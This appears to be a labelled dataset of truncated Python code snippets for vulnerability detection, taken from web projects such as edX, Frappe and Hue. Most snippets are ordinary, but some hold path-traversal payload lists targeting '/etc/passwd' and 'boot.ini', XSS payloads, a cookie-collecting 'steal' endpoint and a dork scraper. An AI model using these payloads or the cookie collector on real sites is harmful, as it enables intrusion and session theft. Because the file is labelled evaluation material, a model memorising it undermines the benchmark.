\t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself", "label": 0}, {"snippet_id": 4733, "code": "'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress", "label": 0}, {"snippet_id": 34774, "code": "\t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not", "label": 0}, {"snippet_id": 44394, "code": "('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc", "label": 0}, {"snippet_id": 24543, "code": "=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions", "label": 0}, {"snippet_id": 32289, "code": "(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +=':%s", "label": 0}, {"snippet_id": 45976, "code": "{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties", "label": 0}, {"snippet_id": 37205, "code": " import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags", "label": 1}, {"snippet_id": 31713, "code": "+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read", "label": 0}, {"snippet_id": 13559, "code": "[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r", "label": 0}, {"snippet_id": 50623, "code": ") def get_client_session(self): \"\"\" Get the Client browser session(used for auto-login based on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the", "label": 0}, {"snippet_id": 31349, "code": "\t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max", "label": 0}, {"snippet_id": 27648, "code": ".response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values", "label": 0}, {"snippet_id": 15879, "code": "} cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self", "label": 0}, {"snippet_id": 13974, "code": "[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 33731, "code": ".html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: ", "label": 1}, {"snippet_id": 49049, "code": "(self, query_params, column_id, ordering_query_param): self.query_params=query_params self.column_id=column_id self.ordering_query_param=ordering_query_param self.query_order=query_params.get(ordering_query_param", "label": 0}, {"snippet_id": 16973, "code": "]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 28235, "code": " \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't", "label": 0}, {"snippet_id": 39711, "code": ".meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not", "label": 0}, {"snippet_id": 24060, "code": "\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR", "label": 0}, {"snippet_id": 47855, "code": "=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log", "label": 0}, {"snippet_id": 14931, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp", "label": 0}, {"snippet_id": 24434, "code": ".BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self", "label": 0}, {"snippet_id": 9196, "code": "]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 52914, "code": " Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission", "label": 0}, {"snippet_id": 36190, "code": "[fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 8715, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i", "label": 0}, {"snippet_id": 43892, "code": "\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df)", "label": 0}, {"snippet_id": 42208, "code": " convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif", "label": 0}, {"snippet_id": 46845, "code": ") @property async def content(self): rv=await self.get_props_by_key('content') if rv: return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return", "label": 1}, {"snippet_id": 47179, "code": " patch from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin", "label": 0}, {"snippet_id": 45552, "code": "=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d", "label": 0}, {"snippet_id": 9559, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$", "label": 0}, {"snippet_id": 9521, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 11323, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, ", "label": 0}, {"snippet_id": 54366, "code": "(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid(row=4, column=1) user_agent.config(width=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column", "label": 0}, {"snippet_id": 53859, "code": " cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode", "label": 1}, {"snippet_id": 35139, "code": "=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef", "label": 0}, {"snippet_id": 16478, "code": " +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 44899, "code": "'message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{", "label": 0}, {"snippet_id": 27537, "code": ") class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A", "label": 0}, {"snippet_id": 26797, "code": "%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 46172, "code": ").datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.GET", "label": 0}, {"snippet_id": 16184, "code": "'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url", "label": 0}, {"snippet_id": 7426, "code": ".COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 51314, "code": "') def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode(", "label": 0}, {"snippet_id": 2351, "code": ".insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\"", "label": 0}, {"snippet_id": 3984, "code": " temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None):", "label": 0}, {"snippet_id": 1749, "code": ">', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults", "label": 0}, {"snippet_id": 31135, "code": "+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp]) \tfunct.ssh_command(slave,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\"", "label": 0}, {"snippet_id": 26619, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 40677, "code": "\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format", "label": 0}, {"snippet_id": 45844, "code": ".deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties", "label": 0}, {"snippet_id": 31111, "code": "\tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct", "label": 0}, {"snippet_id": 34620, "code": "[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in", "label": 0}, {"snippet_id": 32379, "code": " loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join", "label": 0}, {"snippet_id": 23768, "code": " self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 46447, "code": ") dashboard_doc.name=dashboard_doc1.name=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']", "label": 0}, {"snippet_id": 13068, "code": ".views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$'", "label": 0}, {"snippet_id": 13798, "code": ".html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P", "label": 0}, {"snippet_id": 34989, "code": " values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e:", "label": 0}, {"snippet_id": 14107, "code": "+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 15240, "code": " cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes", "label": 0}, {"snippet_id": 30857, "code": "%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"]) \ttemplate=env.get_template", "label": 0}, {"snippet_id": 47117, "code": " indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None", "label": 1}, {"snippet_id": 48361, "code": ".notes=notes ar.save() else: if \"group_id\" not in request.GET: return HttpResponseRedirect(\"/admin?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects.get(id=int(request.GET[\"group_id\"]))", "label": 0}, {"snippet_id": 20681, "code": "'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$'", "label": 0}, {"snippet_id": 15443, "code": "'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback)", "label": 0}, {"snippet_id": 42321, "code": " df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is", "label": 0}, {"snippet_id": 32182, "code": " Markdown browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import", "label": 0}, {"snippet_id": 53742, "code": "(description='EB Config Maker') parser.add_argument('--dest', type=str, help='The destination of the generated eb config', default='./.elasticbeanstalk/config.yml') parser.add_argument('--name', type=str", "label": 0}, {"snippet_id": 24796, "code": ".json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted. \"\"\" print 'Bok-choy servers", "label": 0}, {"snippet_id": 52220, "code": ") if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method ", "label": 0}, {"snippet_id": 30540, "code": "'hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep' \telse: \t\tgrep_act=''", "label": 0}, {"snippet_id": 26681, "code": "/../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e", "label": 0}, {"snippet_id": 44766, "code": "' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try", "label": 0}, {"snippet_id": 43053, "code": " cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta", "label": 0}, {"snippet_id": 10886, "code": "'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback)", "label": 0}, {"snippet_id": 19117, "code": " BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns", "label": 1}, {"snippet_id": 37978, "code": " self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage", "label": 0}, {"snippet_id": 31570, "code": "'Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() ", "label": 0}, {"snippet_id": 35635, "code": " of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants", "label": 0}, {"snippet_id": 13862, "code": ".index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P", "label": 0}, {"snippet_id": 12406, "code": ".views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'", "label": 0}, {"snippet_id": 26754, "code": "%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00", "label": 0}, {"snippet_id": 47337, "code": ", TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum from..models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import", "label": 0}, {"snippet_id": 40734, "code": "\t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe", "label": 0}, {"snippet_id": 16334, "code": "'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render',", "label": 0}, {"snippet_id": 13336, "code": "\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 24836, "code": " Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send", "label": 0}, {"snippet_id": 35420, "code": "\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch", "label": 0}, {"snippet_id": 6495, "code": " again(unless SP requires it through ForceAuthn). The total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint", "label": 0}, {"snippet_id": 50437, "code": " request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries", "label": 0}, {"snippet_id": 15955, "code": ".format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 51268, "code": "*kwargs): super(CustomConfigForm, self).__init__(*args, **kwargs) class ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister(", "label": 0}, {"snippet_id": 35090, "code": "\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message", "label": 0}, {"snippet_id": 30813, "code": "\tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t \tprint(template) \t if serv is not None and", "label": 0}, {"snippet_id": 7777, "code": ".index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/", "label": 0}, {"snippet_id": 35915, "code": " not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue \t\t\telif \"<!--markdown -->\" in value and not(\"<script", "label": 0}, {"snippet_id": 46643, "code": ".with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs): form=self.get_form() if form.is_valid", "label": 0}, {"snippet_id": 34706, "code": " and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\")", "label": 0}, {"snippet_id": 48445, "code": "(current_reservation.id) +\"&srid=\" +request.GET[\"srid\"]) else: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest", "label": 0}, {"snippet_id": 12299, "code": " name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 10531, "code": " suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}", "label": 0}, {"snippet_id": 11351, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 36839, "code": "\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title", "label": 1}, {"snippet_id": 50740, "code": "): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to-html markers unparsed). -nocolor(bool): Remove all color. -screenreader(bool): Use Screenreader mode. -send_prompt", "label": 0}, {"snippet_id": 11024, "code": " not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running", "label": 0}, {"snippet_id": 153, "code": "\"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=',", "label": 0}, {"snippet_id": 52685, "code": "'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application", "label": 0}, {"snippet_id": 36009, "code": "'Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 22409, "code": "\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile", "label": 0}, {"snippet_id": 21186, "code": "[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"", "label": 0}, {"snippet_id": 25751, "code": " ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type=", "label": 0}, {"snippet_id": 47132, "code": ": \"\"\"Delete a record.\"\"\" try: if model.json is None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception", "label": 0}, {"snippet_id": 18097, "code": ")$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 52393, "code": " node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}", "label": 0}, {"snippet_id": 53824, "code": "\")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite", "label": 1}, {"snippet_id": 5527, "code": "/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\"", "label": 0}, {"snippet_id": 54745, "code": ", \"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): 